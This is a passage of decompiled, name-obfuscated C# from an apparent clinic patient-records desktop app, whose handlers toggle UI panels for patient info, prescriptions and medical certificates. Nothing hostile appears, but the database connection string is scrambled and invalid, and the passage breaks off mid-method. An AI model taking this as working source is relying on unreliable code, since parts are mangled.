using System;
using System.Collections.Generic;
using System.Data;
using System.Data.OleDb;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Rk6d7;
using Wz5;
using Xr4y0;

namespace Sb4;

public class Wj2
{
	private OleDbConnection CONN;

	private OleDbCommand CMD;

	public string PATIENTID;

	public string QUERY;

	private object lbldate;

	public object PNLPATIENTINFO
	{
		[CompilerGenerated]
		get
		{
			return _PNLPATIENTINFO;
		}
		[CompilerGenerated]
		set
		{
			_PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionSETTINGS
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionSETTINGS;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionSETTINGS = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object PNLLOGOUT
	{
		[CompilerGenerated]
		get
		{
			return _PNLLOGOUT;
		}
		[CompilerGenerated]
		set
		{
			_PNLLOGOUT = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionSTAFFREQUEST
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionSTAFFREQUEST;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionSTAFFREQUEST = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object PNLMEDICALCERT
	{
		[CompilerGenerated]
		get
		{
			return _PNLMEDICALCERT;
		}
		[CompilerGenerated]
		set
		{
			_PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionPATIENTINFO
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionPATIENTINFO;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionPATIENTINFO = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionEDITPATIENT
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionEDITPATIENT;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionEDITPATIENT = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionhome
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionhome;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionhome = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionMEDRECORD
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionMEDRECORD;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionMEDRECORD = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionADDPATIENT
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionADDPATIENT;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionADDPATIENT = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object S_EDITPATIENTINFO1
	{
		[CompilerGenerated]
		get
		{
			return _S_EDITPATIENTINFO1;
		}
		[CompilerGenerated]
		set
		{
			_S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object S_HOME1
	{
		[CompilerGenerated]
		get
		{
			return _S_HOME1;
		}
		[CompilerGenerated]
		set
		{
			_S_HOME1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object S_MEDICALRECORD1
	{
		[CompilerGenerated]
		get
		{
			return _S_MEDICALRECORD1;
		}
		[CompilerGenerated]
		set
		{
			_S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object S_MEDICALHISTORY1
	{
		[CompilerGenerated]
		get
		{
			return _S_MEDICALHISTORY1;
		}
		[CompilerGenerated]
		set
		{
			_S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object S_MEDICALCERTIFICATE1
	{
		[CompilerGenerated]
		get
		{
			return _S_MEDICALCERTIFICATE1;
		}
		[CompilerGenerated]
		set
		{
			_S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object S_ADDPATIENTINFO1
	{
		[CompilerGenerated]
		get
		{
			return _S_ADDPATIENTINFO1;
		}
		[CompilerGenerated]
		set
		{
			_S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionPNLPRESCRIPTION
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionPNLPRESCRIPTION;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionPNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object PNLPRESCRIPTION
	{
		[CompilerGenerated]
		get
		{
			return _PNLPRESCRIPTION;
		}
		[CompilerGenerated]
		set
		{
			_PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionDMEDCERT
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionDMEDCERT;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionDMEDCERT = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object D_MEDICALCERTIFICATE1
	{
		[CompilerGenerated]
		get
		{
			return _D_MEDICALCERTIFICATE1;
		}
		[CompilerGenerated]
		set
		{
			_D_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionPRESCRIPTION
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionPRESCRIPTION;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionPRESCRIPTION = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object D_PRESCRIPTION1
	{
		[CompilerGenerated]
		get
		{
			return _D_PRESCRIPTION1;
		}
		[CompilerGenerated]
		set
		{
			_D_PRESCRIPTION1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransitionDMEDHISTORY
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransitionDMEDHISTORY;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransitionDMEDHISTORY = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object D_TREATMENTDETAILS1
	{
		[CompilerGenerated]
		get
		{
			return _D_TREATMENTDETAILS1;
		}
		[CompilerGenerated]
		set
		{
			_D_TREATMENTDETAILS1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object RPTPRESCRIPTION
	{
		[CompilerGenerated]
		get
		{
			return _RPTPRESCRIPTION;
		}
		[CompilerGenerated]
		set
		{
			_RPTPRESCRIPTION = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[CompilerGenerated]
		set
		{
			_Timer1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object PNLSTAFFMENU
	{
		[CompilerGenerated]
		get
		{
			return _PNLSTAFFMENU;
		}
		[CompilerGenerated]
		set
		{
			_PNLSTAFFMENU = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object PNLDOCTORMENU
	{
		[CompilerGenerated]
		get
		{
			return _PNLDOCTORMENU;
		}
		[CompilerGenerated]
		set
		{
			_PNLDOCTORMENU = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Login1
	{
		[CompilerGenerated]
		get
		{
			return _Login1;
		}
		[CompilerGenerated]
		set
		{
			_Login1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BunifuTransition1
	{
		[CompilerGenerated]
		get
		{
			return _BunifuTransition1;
		}
		[CompilerGenerated]
		set
		{
			_BunifuTransition1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public Wj2()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		CONN = new OleDbConnection("PceOHCARIEENTINFORMATIONaddpatientccdb");
		CMD = new OleDbCommand();
	}

	private void i6F(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLPATIENTINFO, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false))
		{
			object bunifuTransitionSETTINGS = BunifuTransitionSETTINGS;
			object[] obj = new object[1] { PNLLOGOUT };
			object[] array = obj;
			bool[] obj2 = new bool[1] { true };
			bool[] array2 = obj2;
			NewLateBinding.LateCall(bunifuTransitionSETTINGS, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
			if (array2[0])
			{
				PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(BunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", array = new object[1] { PNLMEDICALCERT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(PNLPATIENTINFO, (Type)null, "BringToFront", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "ShowSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
		else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLPATIENTINFO, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			object bunifuTransitionPATIENTINFO = BunifuTransitionPATIENTINFO;
			object[] obj3 = new object[1] { PNLPATIENTINFO };
			object[] array = obj3;
			bool[] obj4 = new bool[1] { true };
			bool[] array2 = obj4;
			NewLateBinding.LateCall(bunifuTransitionPATIENTINFO, (Type)null, "HideSync", obj3, (string[])null, (Type[])null, obj4, true);
			if (array2[0])
			{
				PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(BunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", array = new object[1] { PNLMEDICALCERT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
	}

	private void m1S(object sender, EventArgs e)
	{
		object bunifuTransitionSTAFFREQUEST = BunifuTransitionSTAFFREQUEST;
		object[] obj = new object[1] { PNLMEDICALCERT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionEDITPATIENT, (Type)null, "HideSync", array = new object[1] { S_EDITPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALRECORD1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "ShowSync", array = new object[1] { S_ADDPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void a5E(object sender, EventArgs e)
	{
		object bunifuTransitionSETTINGS = BunifuTransitionSETTINGS;
		object[] obj = new object[1] { PNLLOGOUT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSETTINGS, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", array = new object[1] { PNLMEDICALCERT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", array = new object[1] { PNLMEDICALCERT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_ADDPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionEDITPATIENT, (Type)null, "HideSync", array = new object[1] { S_EDITPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALRECORD1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "ShowSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void Ti3(object sender, EventArgs e)
	{
		object bunifuTransitionSTAFFREQUEST = BunifuTransitionSTAFFREQUEST;
		object[] obj = new object[1] { PNLMEDICALCERT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_ADDPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALRECORD1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionEDITPATIENT, (Type)null, "ShowSync", array = new object[1] { S_EDITPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void Fr9(object sender, EventArgs e)
	{
		object bunifuTransitionSTAFFREQUEST = BunifuTransitionSTAFFREQUEST;
		object[] obj = new object[1] { PNLMEDICALCERT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_ADDPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionEDITPATIENT, (Type)null, "HideSync", array = new object[1] { S_EDITPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "ShowSync", array = new object[1] { S_MEDICALRECORD1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void o6J(object sender, EventArgs e)
	{
		object bunifuTransitionSTAFFREQUEST = BunifuTransitionSTAFFREQUEST;
		object[] obj = new object[1] { PNLMEDICALCERT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionSETTINGS, (Type)null, "HideSync", array = new object[1] { PNLLOGOUT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_ADDPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionEDITPATIENT, (Type)null, "HideSync", array = new object[1] { S_EDITPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALRECORD1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "ShowSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void i4A(object sender, EventArgs e)
	{
		object bunifuTransitionPNLPRESCRIPTION = BunifuTransitionPNLPRESCRIPTION;
		object[] obj = new object[1] { PNLPRESCRIPTION };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionSETTINGS, (Type)null, "HideSync", array = new object[1] { PNLLOGOUT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDCERT, (Type)null, "HideSync", array = new object[1] { D_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDHISTORY, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPRESCRIPTION, (Type)null, "HideSync", array = new object[1] { D_PRESCRIPTION1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_PRESCRIPTION1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "ShowSync", array = new object[1] { D_TREATMENTDETAILS1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_TREATMENTDETAILS1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void Db8(object sender, EventArgs e)
	{
		object bunifuTransitionSETTINGS = BunifuTransitionSETTINGS;
		object[] obj = new object[1] { PNLLOGOUT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSETTINGS, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDCERT, (Type)null, "HideSync", array = new object[1] { D_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { D_TREATMENTDETAILS1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_TREATMENTDETAILS1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
